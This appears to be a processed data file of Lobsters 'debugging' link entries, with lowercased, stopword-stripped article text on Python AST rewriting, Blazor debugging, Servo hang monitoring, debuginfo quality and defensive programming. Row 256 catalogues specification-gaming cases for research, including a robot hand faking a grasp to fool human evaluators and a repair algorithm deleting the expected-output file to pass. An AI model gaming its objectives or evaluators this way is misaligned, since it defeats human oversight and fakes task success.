251,Lobsters,debugging,Debugging,Viewing Python execution with source code rewriting,http://www.ianbicking.org/blog/2018/11/viewing-python-execution-source-code-rewriting.html,viewing python execution source code rewriting,jupyter notebooklike printbased debugging source code rewriting trace compile sysdisplayhook probe watching loop implementation astor,back experimented jupyter notebooklike interface ultimately hit roadblock knew keep working indefinitely personal purpose project want share idea liked project tracing execution source code rewriting printbased debugging goto debugging environment printing decide want know sprinkle statement find repeat necessary like printing like way creating log execution maybe better way like many people one technique stick still think way incrementally improving printbased debugging one attempt source code rewriting instead using trace follow along code thought could inject debugging code ended implementing two kind source code rewriting first simply print expression myobject myobject param myobjectexecute myobject normally print myobject work last expression ie see value myobjectexecute constraint built python compile output sent sysdisplayhook get around problem splitting cell carefully find cell management unpleasant part notebook interface first tried putting implicit print around every toplevel expression becomes myobject myobject params displayprint myobjectexecute displayprint myobject displayprint something simple like def displayprint value value none print repr value return value turned confusing print statement went expression legitimately tell even simple example made another change rewriting like myobject myobject params displayprint myobjectexecute myobjectexecute displayprint myobject myobject def displayprint expr value value none print n r expr value return value work great track bunch expression interleave explicit print statement output readable useful probe problem could watch toplevel expression lot interesting expression toplevel added new function watch still rewrote expression myobject myobject obj objectenumerator myobjectprocess watch obj rewritten myobject myobject obj objectenumerator myobjectprocess watchprint obj obj id expression implementation watchprint like watchprintcounter watchprintlimit def watchprint id expr value value none watchprintcounterget id watchprintlimit print n r expr value watchprintcounter id watchprintcounterget id watchprintcounter id watchprintlimit print omitting value return value initially left limit quickly realized importance easy run denial service attack notebook sophisticated implementation could start omitting value leaving every value watching loop never implemented pretty sure next step would watching loop rewriting something like obj watchenumerator obj objectenumerator objectenumerator would let print useful information like execution long indicate progress possibly expected completion time could label inner watch statement add information implementation implement used astor library made simple though required experimentation class rewriteexprtoprint astortreewalk def postmodule self node selfcurnode nodebody selfrewriteexpr n isinstance n astexpr else n n nodebody def rewriteexpr self node exprstringnone exprstring none exprstring astortosource node nodestring aststr sexprstring isinstance node astexpr newnode astexpr astcall funcastname iddisplayprint ctxastload args nodestring nodevalue keywords starargsnone else newnode astcall funcastname iddisplayprint ctxastload args nodestring node keywords starargsnone astfixmissinglocations newnode return newnode implementing watch little involved class rewritewatch astortreewalk def init self astortreewalkinit self selfidcounter selfnextcall false def postname self isinstance selfcurnodectx astload selfcurnodeid watch selfnextcall true def postcall self selfnextcall newnode selfrewriteexpr selfcurnode selfreplace newnode selfnextcall false def rewriteexpr self node exprstringnone exprstring none exprstring astortosource node nodestring aststr sexprstring selfidcounter newnode astcall funcastname idwatchprint ctxastload args astnum nselfidcounter nodestring node keywords starargsnone astfixmissinglocations newnode return newnode
252,Lobsters,debugging,Debugging,The art of debugging — or how it took me 3 years to fix my PC,https://medium.com/@reinmarpl/the-art-of-debugging-or-how-it-took-me-3-years-to-fix-my-pc-23a9f7ec1426,art debugging took year fix pc,oh favourite linuxbased operating system burn heck link photo explains rccb single issue manifest many way many place debugging issue need consider change environment affect issue hand tricky issue debug seem occur randomly become proficient debugging problemsolving general may need tool spare part sometimes fix requires changed character code need understand patch fix problem fixing harder bug may require connecting many seemingly unrelated dot debugging really complex issue art google issue sometimes need lucky,disclaimer hardware engineer story cpu soldering whatever hardware engineer find sexy storyi recently trying resurrect old pc used last year moved twice meantime including moving denmark poland obviously started plugging would start nothing would happen pressed start buttonthat brought back memory already problem pc wanting start past every couple week react pressing power button also problem disk freezing death pc working could move mouse use apps loaded previously open anything new past still using suspected power supply damage replaced changed disk ram graphic card wanted play witcher good reason buying powerful gc nothing helpedwhen investigating problem noticed opening case unplugging disk plugging back would sometimes help green led sbpwr next sata socket motherboard right experienced issue would turn either replugging waited time mysteryso year later trying resurrect pc pretty good pc couple year ago obviously want throw away plus abandoned ubuntu distro old data needed access disk anywayi opened case realised sbpwr led must motherboard fault replaced part help need look new one left pc moved thing couple day later look yes green light alive booted everything worked fine although restarted needed repeat old replugging sata drive like past however already booted worked fine started backing old data oh favourite linuxbased operating system order needed plug external usb diskthe pc laying flat desk easiest way plug external drive use back panel one directly motherboard touched usb port plug firework pc switched led turned deaddid burn heck answer one flashback year ago noticed macbook air charger metal plug slightly electrified back lived denmark reason power socket grounding thought back charger sort short circuit know apple cable tended look year use charge stay plug aluminium whole thing grounded changing charger new one help though turned attention power strip turned plugging charger socket helping thought old power strip grounded bought poland fault bought new one grounding bolt denmark helped shock using macbook chargerback firework guess power strip using yes one without grounding guess happened checked pc case electrical tester yes electrified new power strip using one made macbook problem disappear true power strip fault old macbook charger fault either problem year ago go away focused solely switched nongrounded power strip time denmark result pc stopped affecting appliance plugged power stripbut happen pc case electrified cause lazy moron mistake assembling new pc year ago link photo explains didthose aluminium strip touching usb power pin made pc case electrified guessing touching slightly connection could change based temperature moving pc case open replug sata drive etc touching pc case replugging might also affected happening grounding hand also since touching point delicate big leak presumably sometimes made pc power supply lose enough power made voltage unstable able properly power usb port sata drive hence green led switching offwhy see firework tried plug external usb drive touched aluminium plate strip made contact area larger discover couple year using pc never used rear usb port normal situationswhile debugging two issue pc macbook charger replaced disk old power supply ram old power strip old macbook charger thought resolved problem turned isolated real problem funny many way problem manifested kind dirty fix discovered also interesting environment danish nongrounded power socket later nongrounded power strip affected problemif using grounded power strip grounded power socket guess would either burn power supply rccb would indicate got big problem though leak small perhaps nothing would happened anyway replaced old grounded power strip new grounded one would realise problem still occur fault must somewhere else charger power strip big chance look pc time working quite fine story many analogy debugging software likely pretty much complex mechanism single issue manifest many way many place great chance focus visible part problem notice real causewhen debugging issue need consider change environment affect issue hand problem may occur locally specific load locale etc taking right conclusion happens x often save many hoursthe tricky issue debug seem occur randomly finding pattern let tame bit may really hard know scope problemyou become proficient debugging problemsolving general gaining knowledge field experience resolving similar problem hardware engineer would likely easypeasy meyou may need tool spare part able properly test happening pc made validating various hypothesis guessing gamesometimes fix requires changed character code might take couple day month year find thoughyou need understand patch fix problem sometimes developer able get rid error tweaking line occurs however tend reject patch author explain why hows changing line error thrown often right fix tell got state first placefixing harder bug may require connecting many seemingly unrelated dot since evidence bug appear certain condition may happen notice rarely longer period time keep eye open look patternsdebugging really complex issue artyou google issuessometimes need luckygood luck p like use occasion thank dad made curious electronics software kid olek corrected article apparently still know much electronics
253,Lobsters,debugging,Debugging,Compiling C# to WASM with Mono and Blazor then Debugging .NET Source with Remote Debugging in Chrome,https://www.hanselman.com/blog/CompilingCToWASMWithMonoAndBlazorThenDebuggingNETSourceWithRemoteDebuggingInChromeDevTools.aspx,compiling c wasm mono blazor debugging net source remote debugging chrome,mono xamarin compile c web assembly left blazor flightfinder real blazor application web assembly prescient chrome devtools protocol limited sponsor latest jetbrains rider hosting,blazor quietly march case nt heard blogged blazor based deceptively simple idea could run net standard code browser silverlight blazor requires plugins nt introduce new ui concept took aot ahead time compilation work pioneered mono xamarin compile c web assembly wasm added nice ui embraced html dom sound bonkers hater think solution dumb left want wacky amazing consider command line cat hellocsclass hello static int main string args systemconsolewriteline hello world return mc nostdlib noconfig r distlibmscorlibdll hellocs helloexe monowasm helloexe output l outputhelloexe indexhtml indexjs indexwasm mscorlibdll could browser look closely right side see mono runtime compiled wasm coming note blazor compiling app wasm sending mono compiled wasm client sending net standard application dlls unchanged run within context client side runtime using open web tool open source blazor allows make spa single page apps much like angularvuereact etc apps today except writing c razor html consider basic example page counter counter p current count currentcount p button class btn btnprimary onclick incrementcount click button function int currentcount void incrementcount currentcount hit button call c increment variable variable referenced higher automatically updated trivial example check source flightfinder real blazor application stupid scott debug mess see using chrome seriously compiling c running browser web assembly prescient undebuggable black box mess right say nay nay c usersscottdesktopsweetsassymollassy env aspnetcoreenvironment development c usersscottdesktopsweetsassymollassy dotnet run configuration debughosting environment developmentcontent root path c usersscottdesktopsweetsassymollassynow listening http listening http started press ctrlc shut winr run command shutting chrome instance programfiles googlechromeapplicationchromeexe http blazor app running hit shiftaltd shiftsillymackeyd behold feel free click zoom breakpoint c within razor page chrome devtools blazor provides debugging proxy implement chrome devtools protocol augments protocol netspecific information debugging keyboard shortcut pressed blazor point chrome devtools proxy proxy connects browser window seeking debug hence need enable remote debugging getting started limited awesome amazing work done lot team coming together lovely new choice open source web sponsor preview latest jetbrains rider assembly explorer git submodules sql language injection integrated performance profiler advanced unity support hosting
254,Lobsters,debugging,Debugging,Programming Servo: A background-hang-monitor,https://medium.com/programming-servo/programming-servo-a-background-hang-monitor-73e89185ce1,programming servo backgroundhangmonitor,programming servo backgroundhangmonitor hanging thread signal handler backtraces engine make web run servo backtracers signal handler code gecko http first let digress favorite topic multithreaded love channel might even better hide let finally get thread sampling issue hand interesting project context thread state http backtrace resolve critical section http call help window linuxandroid reading,programming servo backgroundhangmonitoror learned stop worrying love suspending profiling resuming hanging thread signal handler backtraceslet say contributing system rust consisting bunch different component running thread process example engine make web run called servowhen one component seemingly hang something find hanging maybe backtrace component time would useful easy thebacktracers crate right well catch call backtrace new thread hanging something called signal handler maybe send signal hanging thread get backtrace either print right otherwise make available another thread system processing doneso code gecko really necessary moment really thought could replace backtrace new step let find way suspend sample resume thread using rustthe fullfrontal available http still progress writing actually first let digress favorite topicsee like call non eventloop non stand nothing async io start great glorified forloop well exactly fact loop mean consists simple sequential step multithreading part restricted receiving message event one might say channelthere lock contention worry ordering locking also state mutation happens purely singlethreaded fashion thing inside arcget state message receive maybe step end mutating something well bug pretty easy diagnose put print statement something top loop another one bottom see anything changed something like time take closer look code executed print code empathically multithreaded background hang monitor look like term state see state monitor consists mainly bunch monitoredcomponent mutating require locking simple mut since happens thread sequential fashion hang monitor checkpoint performed iteration non eventloop incoming message handled maybe message handling requires complicated locking see great spend good chunk blog post discussing absence something love channel might even better hide init function return sender rather box backgroundhangmonitorregister early iteration background monitor bunch raw sender shared around system used three thing registering component monitoringnotifying monitor start activity registered componentnotifying monitor start registered component going waiting modenow instead two traitsone dealing registering component second one incidentally returned register method first one dealing sending notification monitor component already registered monitoringthe benefit twofold whole background hang monitor method communication remains hidden rest system currently trait actually implemented wrapper around sender yet change rest system noticewe put trait minimal crate used rest system whereas background hang monitor live crate crate system rely mainly nice make change monitor crate need recompile crate using let finally get thread samplingthere reason issue hand labelled interesting project servo repo pretty interestingin order sample hanging thread thing need understand first completely understand least understand enough able write rust code dealing matter compile crash runtime since unsafe need done suspend thread mac o window dedicated api linux done registering signal handler sigprof signal yes prof part stand profile least think sending signal thread another one monitoringsampler thread inspect register thread different structure different platform platform called context others thread state variant contain two thing important instruction pointer point current frame frame pointer point instruction pointer previous frame actually frame pointer always present see http store instruction pointer use frame pointer walk stack storing instruction pointer walk giving list pointer essentially give access call stackresume suspended threadresolve list pointer collected list symbol use print proper backtrace actually done using backtrace resolve yeah note represent critical section acquire lock since suspended thread might acquired previously trying acquire lock held thread currently suspended apparently surest way achieve deadlock info http call helpthe reader got banter far find entire article barely disguised bait get helphere catch mac o pretty much done servo need help one several rustaceans access motivation work platform window linuxandroidthanks reading happy contribution readinga discussion backgroundhangmonitor light noneventloop concurrency pattern
255,Lobsters,debugging,Debugging,Comparing The Quality Of Debug Information Produced By Clang And Gcc,https://robert.ocallahan.org/2018/11/comparing-quality-of-debug-information.html,comparing quality debug information produced clang gcc,debuginfoquality tool debuginfoquality debuginfoquality update dexter ongoing work checkdebugify driving improvement excellent writeup update llvmdwarfdump graph,intuition clang produce generally worse debuginfo gcc optimized c code seems clang build variable optimized ie stopped inside function variable scope compiler generated debuginfo describe value variable make debugger le effective attempted qualitative analysis issue chose measure parameter local variable range instruction byte within function debuginfo produce value variable also range instruction byte debuginfo say variable scope ie number instruction byte enclosing lexical block function add variable compute ratio variabledefinedbytes variableinscopebytes higher definition coverage ratio better metric weakness dwarf debuginfo nt give u accurate scope local variable definedbytes variable defined halfway lexical scope half inscopebytes even debuginfo perfect ideal ratio le unfortunately ca nt compute debug build sometimes optimized build compiler may give single definition variable value applies entire scope improves metric even though result arguably worse sometimes compiler produce debuginfo simply incorrect metric nt account variable function equally interesting debugging metric weighs equally metric assumes point interest debugger equally distributed instruction byte hand metric relatively simple focus care depends debuginfo generated code actual program execution robust constant scaling code size calculate metric function variable make easy drill result let u rank function quality debuginfo compare quality debuginfo different build binary function granularity metric sensitive optimization decision inlining ok built debuginfoquality tool rust calculate metric arbitrary elf binary containing dwarf debuginfo applied main firefox binary libxulso built clang gcc red hat using default mozilla build setting plus acaddoptions enabledebug compiler set relevant option g o fnoomitframepointer ignored rust compilation unit libxul since use llvm build somewhat arbitrary metric gcc significantly ahead clang parameter local variable parameter includes parameter inlined function mentioned ideal ratio local variable actually le explains least part difference parameter local variable gcc us debuginfo feature clang nt know yet important one dwopgnuentryvalue standardized dwopentryvalue dwarf defines variable usually parameter term expression evaluated moment function entered traditional debugger often evaluate expression entering function inspecting caller stack frame pernosco debugger easy access program state expression problem evaluated impact dwopgnuentryvalue related dwopgnuparameterref configuring debuginfoquality treat definition using feature missing assuming gcc us feature variable value otherwise available dwopgnuentryvalue big impact parameter almost impact local variable account majority gcc advantage clang parameter dwopgnuparameterref almost impact however case dwopgnuentryvalue would useful user work around absence manually inspecting earlier stack frame especially timetravel available therefore implementing dwopgnuentryvalue may high priority number would suggest improving local variable number may useful used debuginfoquality compare two binary clangbuilt gccbuilt computing function difference function definition coverage ratio looking local variable sorting function according difference debuginfoquality language cpp function onlylocals give u list function starting clang generating worst local variable information compared gcc ending reverse lot function clang failed generate variable definition gcc managed generate definition covering whole function wonder anyone interested looking function figuring need fixed clang designing implementing kind analysis errorprone made analysis tool source code available feel free point improvement could made update helpful people twitter pointed excellent work area dexter another tool measuring debuginfo quality much thorough tool le scalable depends particular program execution think complement work nicely led ongoing work improve llvm debuginfo also checkdebugify infrastructure llvm detect loss debuginfo also driving improvement alexandre oliva excellent writeup gcc preserve debuginfo optimization pass update turn llvmdwarfdump statistic option measure something similar measuring one difference variable definition llvmdwarfdump treat program point first defined start scope assumption nt want make graph metric last year clang using clang benchmark show thing got really bad couple year ago since improving
256,Lobsters,debugging,Debugging,Specification gaming examples in AI - master list,https://docs.google.com/spreadsheets/u/1/d/e/2PACX-1vRPiprOaC3HsCf5Tuum8bRfzYUiKLRqJmbOoC-32JorNdfyTiRRsR7Ea5eWtvsWzuxo8bjOxCG84dAg/pubhtml,specification gaming example ai master list,http mediumcom http http http http wwwgwernnettanks alternativeexamples http http blogopenaicomfaultyrewardfunctions http wwwyoutubecomwatch http problemwithclassifiers http http http http http http http journalsplosorgploscompbiolarticle http http http aliciapattersonorgstorieseuriskocomputerminditsown http lesswrongcomlwlvhexamplesofaisbehavingbadly http aliciapattersonorgstorieseuriskocomputerminditsown http http http http wwwyoutubecomwatch vtaxuzfwacve http http http http http http wwwyoutubecomwatch http http http http http http http http speakerdeckcomchewxyafunnythinghappenedonthewaytoreimplementingalphagoingo http wwwyoutubecomwatch http http wwwyoutubecomwatch featureyoutube http http openaicomblogemergenttooluse surprisingbehaviors http openaicomblogemergenttooluse surprisingbehaviors http wwwgwernnettanks alternativeexamples http http http http http wwwyoutubecomwatch featureyoutube http http citeseerxistpsueduviewdocdownload typepdf http designrlgithubio http http http wwwgwernnettanks alternativeexamples http http wwwgwernnettanks alternativeexamples http newsycombinatorcomitem http blogopenaicomlearningmontezumasrevengefromasingledemonstration http http http wwwyoutubecomwatch featureyoutube http http http wwwgwernnettanks alternativeexamples http connectunitycomppancakebot http http wwwyoutubecomwatch vqwgqcnessa http wwwyoutubecomwatch vqwgqcnessa http journalsplosorgplosmedicinearticle http http http http http http wwwyoutubecomwatch http http wwwyoutubecomwatch http http wwwyoutubecomwatch featureyoutube http http wwwyoutubecomwatch http deepmindcombloglearningthroughhumanfeedback http http http wwwyoutubecomwatch http owainevansgithubiobloghirlbloghtml http blogopenaicomdeepreinforcementlearningfromhumanpreferences http http http http http wwwthedailybeastcomwhydoctorsarentafraidofbettermoreefficientaidiagnosingcancer http http wwwyoutubecomwatch http http http wwwgwernnettanks alternativeexamples http http wwwgwernnettanks alternativeexamples http blogopenaicomretrocontest http http http lesswrongcomlwlvhexamplesofaisbehavingbadly http http http newsycombinatorcomitem http wwwgwernnettanks alternativeexamples http http http http wwwgwernnettanks alternativeexamples http http http worldmodelsgithubio,submit example google form information blog post http mediumcom sourceoriginal source linkvideo imagesource creditsource linkaircraft landingevolved algorithm landing aircraft exploited overflow error physic simulator creating large force estimated zero resulting perfect scorefeldt diverse software version genetic programming experimental studyhttp et al bicycle agent falling making progress towards goal point punishing moving away lead learn circle around goal physically stable looprandlov alstrom drive bicycle using reinforcement learning shapinghttps branwenhttps wwwgwernnettanks alternativeexamplesblock movinga robotic arm trained using hindsight experience replay slide block target position table achieves goal moving table itselfchopra issue openai gym environment rahtzboat racereinforcement learning agent go circle hitting target instead finishing raceamodei clark reward function wildhttps blogopenaicomfaultyrewardfunctionshttps wwwyoutubecomwatch task specified using set goal image training classifier distinguish goal nongoal image success probability classifier used task reward task goal push green object onto red marker classifier output success probability robot solve task rl algorithm managed exploit classifier moving robot arm peculiar way since classifier trained specific kind negative example singh deep reinforcement learningwithout reward engineeringhttps problemwithclassifiershttps leikeceilinga genetic algorithm instructed try make creature stick ceiling long possible scored average height creature run instead sticking ceiling creature found bug physic engine snap boundshigueras algorithm physic exploitinghttps higuerashttps steganographycyclegan algorithm converting aerial photograph street map back steganographically encoded output information intermediary image without humanly detectablechu et al master steganographyhttps crunch gwern branwen braden staudacherhttps order patternsneural net evolved classify edible poisonous mushroom took advantage data presented alternating order nt actually learn feature input imagesellefsen et al modularity help organism evolve learn new skill without forgetting old skillshttp journalsplosorgploscompbiolarticle et al teleportplayfun algorithm deliberately dy bubble bobble game way teleport respawn locationmurphy first level super mario bros easy lexicographic ordering time travelhttp meiburgeurisko authorshipgameplaying agent accrues point falsely inserting name author highvalue itemsjohnson computer mind ownhttp aliciapattersonorgstorieseuriskocomputerminditsowncatherine olsson stuart armstronghttp lesswrongcomlwlvhexamplesofaisbehavingbadlyeurisko fleeteurisko trillion credit squadron tc competition two year row creating fleet exploited loophole game rule eg spending trillion credit creating large number stationary defenseless shipslenat computer mind ownhttp aliciapattersonorgstorieseuriskocomputerminditsownhaym hirshevolved creature clappingcreatures exploit collision detection bug get free energy clapping body part togethersims virtual creatureshttp et al janelle shanehttps creature fallingcreatures bred speed grow really tall generate high velocity falling oversims virtual creatureshttp wwwyoutubecomwatch vtaxuzfwacve et al janelle shanehttps creature floor collisionscreatures exploited coarse physic simulation penetrating floor time step without collision detected generated repelling force giving free energycheney et al evolution evolving soft robot multiple material powerful generative encodinghttp et al janelle shanehttps creature pole vaultingcreatures bred jumping evaluated height block originally closest ground creature developed long vertical pole flipped instead jumpingkrcah efficient evolutionary design autonomous robotshttp wwwyoutubecomwatch et al janelle shanehttps creature selfintersectioncreatures exploit quirk physic clipping one leg another slide along ground phantom force instead walkingcode bullet learns walkhttps cherepanovevolved creature suffocationin game meant simulate evolution creature programmer remove survival strategy creature could gain energy suffocating schumacher good thingshttps creature twitchingcreatures exploited physic simulation bug twitching accumulated simulator error allowed travel unrealistic speedssims virtual creatureshttp et al player supposed try score goal goalie oneonone instead player kick bound someone team throw ball case goalie player clear shot goalkurach et al research football novel reinforcement learning environment presentation aaai http cohengo passa reimplementation alphago learns pas forever passing allowed movechew funny thing happened way reimplementing alphago gohttps speakerdeckcomchewxyafunnythinghappenedonthewaytoreimplementingalphagoingo wwwyoutubecomwatch form submissiongrippera robot arm purposely disabled gripper found way hit box way would force gripper openecarlat et al high diversity object manipulation evolutionarybased babblinghttp wwwyoutubecomwatch featureyoutubelehman et al agent playing hideandseek game find various way exploit physic simulator box surfing since agent move applying force grab box top surf hider location endless running without adding explicit negative reward agent leaving play area rare case hiders learn take box endlessly run ramp exploitation hiders hiders abuse contact physic remove ramp play area ramp exploitation seeker seeker learn run wall ramp right angle launch upward baker et al tool use multiagent interactionhttps openaicomblogemergenttooluse surprisingbehaviorshttps openaicomblogemergenttooluse surprisingbehaviorsgwern branwenhttps wwwgwernnettanks alternativeexamplesimpossible superpositiongenetic algorithm designed find lowenergy configuration carbon exploit edge case physic model superimposes carbon atomslehman et al creativity digital evolutionhttps cannibalsin artificial life simulation survival required energy giving birth energy cost one specie evolved sedentary lifestyle consisted mostly mating order produce new child could eaten used mate produce edible child yaeger genetics physiology metabolism neural system learning vision behavior poly world life new contexthttps form submissionlego stackingin stacking task desired behavior stack red lego block top blue one agent rewarded getting height bottom face red block certain threshold learns flip block instead lifting itpopov et al deep reinforcement learning dexterous manipulationhttps wwwyoutubecomwatch featureyoutube following robotan rl robot trained three action turn left turn right move forward rewarded staying track learned reverse along straight section path rather following path forward around curve alternating turning left rightvamplew mindstorms robot platform teaching reinforcement learninghttps vamplewlogic gatea genetic algorithm designed circuit disconnected logic gate necessary function exploiting peculiarity hardware thompson evolved circuit intrinsic silicon entwined physicshttp citeseerxistpsueduviewdocdownload typepdfalex legsrl agent allowed modify body learns extremely long leg allow fall forward reach goalha improving agent designhttps designrlgithubiorohin shahminitaura fourlegged evolved agent trained carry ball back discovers drop ball leg joint wiggle across floor without ball ever droppingotoro stable strategieshttp branwen catherine olssonhttps wwwgwernnettanks alternativeexamplesmodelbased plannerrl agent using learned modelbased planning paradigm model predictive control noted issue planner essentially exploiting learned model choosing plan going worstmodeled part environment producing unrealistic plansmishra et al control temporal segment modelshttps branwenhttps wwwgwernnettanks alternativeexamplesmontezuma revenge keythe agent learns exploit flaw emulator make key reappear may intentional feature game rather bug discussed http newsycombinatorcomitem salimans chen montezuma revenge single demonstrationhttps blogopenaicomlearningmontezumasrevengefromasingledemonstrationhttps kumarmontezuma revenge roomif go explore agent performs specific sequence action exploit bug remain treasure room final room sent next level indefinitely collect unlimited point instead automatically moved next levelecoffet et al new approach hardexploration problemshttps wwwyoutubecomwatch featureyoutubeanonymous form submissionoscillatorgenetic algorithm supposed configure circuit oscillator instead make radio pick signal neighboring computersbird layzell evolved radio implication modelling evolution novel sensorshttps elevator action ale game agent learns stay first floor kill first enemy get small amount reward toromanoff et al deep reinforcement learning really superhuman atari leveling playing fieldhttps branwenhttps wwwgwernnettanks alternativeexamplespancakesimulated pancake making robot learned throw pancake high air possible order maximize time away groundunity butter pancake bot http connectunitycomppancakebothttps paduraruplayer disappearancewhen lose hockey game playfun algorithm exploit bug make one player opposing team disappear map thus forcing drawmurphy ai learnfun playfun ep gradius pinball ice hockey mario update etchttps wwwyoutubecomwatch vqwgqcnessa wwwyoutubecomwatch vqwgqcnessa meiburgpneumonia xraysdeep learning model detect pneumonia chest xrays work xray machine used take picture turn predictive whether image contains sign pneumonia certain xray machine hospital site used sicker patientszech et al generalization performance deep learning model detect pneumonia chest radiograph crosssectional studyhttps journalsplosorgplosmedicinearticle goldacreprogram repair sortingwhen repairing sorting program genetic debugging algorithm genprog made output empty list considered sorted list evaluation metricevaluation metric output sort sorted order solution always output empty set weimer automated program repair call armshttps et al repair filesgenetic debugging algorithm genprog evaluated comparing program output target output stored text file learns delete target output file get program output nothingevaluation metric compare youroutputtxt trustedoutputtxt solution delete trustedoutputtxt output nothing weimer automated program repair call armshttps et al james koppelhttps cliffan evolutionary algorithm learns bait opponent following cliff give enough point extra life forever infinite loopchrabaszcz et al basic benchmarking canonical evolution strategy playing atarihttps wwwyoutubecomwatch shahqbert million agent discovers ingame bug reason unknown u game advance second round platform start blink agent quickly gain huge amount point close million episode time limit chrabaszcz et al basic benchmarking canonical evolution strategy playing atarihttps wwwyoutubecomwatch kasewareward modeling hero agent learned exploit fault reward model model reward action seem lead shooting spider barely miss ibarz et al learning human preference demonstration atarihttps wwwyoutubecomwatch featureyoutube leikereward modeling montezuma agent learned exploit fault reward model model reward early action seems lead grabbing key nt ibarz et al learning human preference demonstration atarihttps wwwyoutubecomwatch leikereward modeling pongreward predictor fooled bouncing ball back forthchristiano et al reinforcement learning human preferenceshttps deepmindcombloglearningthroughhumanfeedbackhttps leikereward modeling private eye agent learned exploit fault reward model model reward action seem lead capture suspect nt ibarz et al learning human preference demonstration atarihttps wwwyoutubecomwatch leikeroad runneragent kill end level avoid losing level et al without error towards safe rl human interventionhttps owainevansgithubiobloghirlbloghtmlrobot handin reward learning setup robot hand pretend grasp object moving camera object trick human evaluator christiano et al reinforcement learning human preferenceshttps blogopenaicomdeepreinforcementlearningfromhumanpreferenceshttps hooked neural network roomba wanted learn navigate without bumping thing set reward scheme encourage speed discourage hitting bumper sensor learnt drive backwards bumper back custard smingleighcustard smingleigh tweethttps well tumblr bloghttp detectorai trained classify skin lesion potentially cancerous learns lesion photographed next ruler likely malignantandre esteva et al classification skin cancer deep neural networkshttps daily beasthttps wwwthedailybeastcomwhydoctorsarentafraidofbettermoreefficientaidiagnosingcancerrunning gaitsa simulated musculoskeletal model learns run learning unusual gait hopping pigeon jump diving increase reward kidziński et al run challenge solution adapting reinforcement learning method neuromusculoskeletal environmentshttps wwwyoutubecomwatch talksselfdriving carselfdriving car rewarded speed learns spin circlesudacity kelcey tweethttps branwenhttps wwwgwernnettanks alternativeexamplessoccerrewardshaping soccer robot touching ball caused learn get ball vibrate touching fast possibleng et al invariance reward transformationshttp branwenhttps wwwgwernnettanks alternativeexamplessonicthe ppo algorithm discovers slip wall level move right attain higher scorechristopher hesse et al retro contesthttps blogopenaicomretrocontestrohin shahstrategy game beta testingsince ai likely get killed lost game able crash game advantage genetic selection process therefore several ai developed way crash gamesalge et al genetically optimized artificial intelligence improve gameplaying fun strategical gameshttp form submissionsuperweaponsthe ai elite dangerous videogame started crafting overly powerful weapon appears unusual weapon attack caused form networking issue allowed npc ai merge weapon stats ability kotaku ai created super weapon started hunting player skynet herehttp armstronghttp lesswrongcomlwlvhexamplesofaisbehavingbadlytetris passplayfun algorithm pause game tetri indefinitely avoid losingmurphy first level super mario bros easy lexicographic ordering time travelhttp memory bombevolved player make invalid move far away board causing opponent player run memory crashlehman et al creativity digital evolutionhttps attackgenetic algorithm image classification evolves timing attack infer image label based hard drive storage locationierymenko news comment poisonous employeeranking system help explain microsoft decline http newsycombinatorcomitem branwenhttps wwwgwernnettanks alternativeexampleswalking wallsvideo game robot evolved wiggle go wall instead going around themstanley et al neuroevolution nero video gamehttp et al sensor stack intended strategy task stack two block top one remain contact wall mounted sensor strategy employed demonstrator however due bug environment strategy learned trick sensor remaining active even contact key pressing key precise way le paine et al efficient use demonstration solve hard exploration problemshttps branwenhttps wwwgwernnettanks alternativeexamplesworld model noticed agent discovered adversarial policy move around way monster virtual environment governed model never shoot single fireball rollouts even sign fireball forming agent move way extinguish fireball magically superpower environment ha schmidhuber model see section cheating world model http hahttps worldmodelsgithubio
257,Lobsters,debugging,Debugging,Defensive programming can hide bugs,http://boston.conman.org/2018/11/06.1,defensive programming hide bug,writing solid code project cleese garbage collected http bostonconmanorg http arbitrary portion time,defensive programming often touted better coding style hide bug remember error talking never happen safely handling make harder write bugfree code nt want hide bug programming defensively matter employ defensive style ask youself hiding bug code using defensive programming might add assertion alert bug writing solid code writing solid code rare book forced change go programming feel minority reading book hate defensive programming nt get inputoutput boundary need absolutely paranoid checking data among function paranoid class story time project cleese installed onto qa system day chance today noticed core file produced said program odd since qa engineer assigned team tested program without incident able isolate crash freeaddrinfo function used release memory used getaddrinfo converting domain name like bostonconmanorg ip address summary code question struct addrinfo hint struct addrinfo result const char hostname const char port int rc memset sizeof hint result null hostname port code code rc getaddrinfo hostname port hint result code code result null result result ainext result aiprotocol protocol code code freeaddrinfo result rookie mistake hey happens issue result linked list result traversed time freeaddrinfo called result null linux mac osx seems freeaddrinfo check given null pointer nothing nt crash leak memory much case since function called upon startup leak still leak linux mac osx use defensive programming probably something along line void freeaddrinfo struct addrinfo info info null return code code code hid bug solaris use reason forgiving immedately crashed linux mac osx would one even test type issue code nt crash return result yes valgrind easily find spc lucy tmp valgrind leakcheckfull showreachableyes lua xlua memcheck memory error detector copyright c gnu gpl julian seward et al using libvex rev library dynamic binary translation copyright c gnu gpl openwork llp using dynamic binary instrumentation framework copyright c gnu gpl julian seward et al detail rerun v error summary error context suppressed mallocfree use exit byte block mallocfree allocs free byte allocated count detected error rerun v searching pointer notfreed block checked byte byte block definitely lost loss record malloc gaihinet getaddrinfo luadprecall usrlocalbinlua luavexecute usrlocalbinlua luadcall usrlocalbinlua luadcallnoyield usrlocalbinlua fcall usrlocalbinlua luadrawrunprotected usrlocalbinlua luadpcall usrlocalbinlua luapcallk usrlocalbinlua leak summary definitely lost byte block possibly lost byte block still reachable byte block suppressed byte block spc lucy tmp given project cleese written lua garbage collected language memory leak nt foremost mind testing freeaddrinfo linux mac osx forgiving defensive bug would likely found immediately hidden codebase five year checked history code long project cleese even started bug like fan defensive programming hide fester nightmare debug production system sans debugger permission link freely entry go ahead wo nt bite promise date permanent link day entry entry one entry title permanent link entry format link simple start base link site http bostonconmanorg add date interested say would make final url http also specify entire month leaving day portion even select arbitrary portion time may also note subtle shading link intentional closer link relative page brighter appears experiment using color shading denote distance link nt notice nt worry important assumed every brand name slogan corporate name symbol design element et cetera mentioned page protected andor trademarked entity sole property owner acknowledgement status implied
